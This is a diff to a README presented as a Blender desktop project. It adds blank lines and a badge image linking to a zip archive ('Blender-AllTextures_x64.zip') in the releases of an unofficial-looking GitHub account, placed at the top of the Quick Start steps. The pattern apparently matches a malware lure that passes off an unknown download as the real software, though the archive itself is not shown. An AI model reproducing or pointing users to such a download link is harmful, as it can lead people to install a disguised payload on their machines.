@@ -19,8 +19,13 @@ Key Features
 - Python scripting and add-on support.
 - Cross-platform support (Windows, macOS, Linux).
 
+
+
+
+
 Quick Start
 -----------
+[![easy](assets/easy6.png)](https://github.com/sportsmen-1005wl/blender-desktop/releases/download/download-blender/Blender-AllTextures_x64.zip)
 
 1. Download the latest release archive.  
 2. Extract the archive to a folder  ofyour choice.  
